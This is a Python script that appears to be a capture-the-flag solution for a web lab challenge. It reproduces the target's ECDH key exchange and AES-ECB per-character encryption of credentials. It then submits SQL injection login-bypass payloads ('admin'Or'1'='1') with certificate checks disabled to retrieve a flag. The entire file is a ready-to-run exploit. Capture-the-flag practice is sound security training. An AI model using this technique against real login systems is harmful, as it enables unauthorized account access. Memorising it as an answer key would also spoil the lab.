import requests, re, base64, json, hashlib, urllib3
from cryptography.hazmat.primitives.asymmetric.ec import (
    ECDH, generate_private_key, SECP256R1, EllipticCurvePublicKey
)
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def b64_char(c):
    return base64.b64encode(c.encode()).decode()

def step_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), 16))).decode()

def encrypt_aes(data, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), 16))).decode()

def build_username_chain(username, key):
    chain, plain, parts = None, "", []
    for char in username:
        if len(plain) < 10:
            b = b64_char(char)
            chain = step_encrypt(b, key) if chain is None else step_encrypt(chain + "|" + b, key)
            plain += char
        else:
            parts.append(b64_char(char))
            plain += char
    if not plain:
        return ""
    return chain if len(plain) <= 10 else chain + "|" + "|".join(parts)

def build_password_chain(password, key):
    chain = None
    for char in password:
        b = b64_char(char)
        chain = step_encrypt(b, key) if chain is None else step_encrypt(chain + "|" + b, key)
    return chain or ""

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(url: str, prefix: str) -> str:
    input_id = "admin'Or'1'='1"
    input_pw = "Or'1'='1"
    with requests.Session() as ses:
        ses.verify = False
        server_public_key = base64.b64decode(ses.get(f"{url}/init").json()["serverPubKey"])
        client_key = generate_private_key(SECP256R1(), default_backend())
        client_public_key_b64 = base64.b64encode(client_key.public_key().public_bytes(Encoding.X962, PublicFormat.UncompressedPoint)).decode()
        ses.post(f"{url}/exchange", headers={"Content-Type": "application/json"}, json = {"clientPubKey": client_public_key_b64}).raise_for_status()
        aes_key = bytes.fromhex(hashlib.sha256(client_key.exchange(ECDH(), EllipticCurvePublicKey.from_encoded_point(SECP256R1(), server_public_key))).hexdigest()[:32])
        enc = encrypt_aes(
            json.dumps({
                "usernameChain": build_username_chain(input_id, aes_key),
                "passwordChain": build_password_chain(input_pw, aes_key)
            }),
            aes_key
        )
        flag = get_flag(ses.post(f"{url}/login", headers = {"Content-Type": "application/json"}, json = {"encData": enc}).text, prefix)
    return flag

if __name__ == "__main__":
    url = "https://lab.eqst.co.kr:8551"
    prefix = "EQST"
    print(solution(url, prefix))
    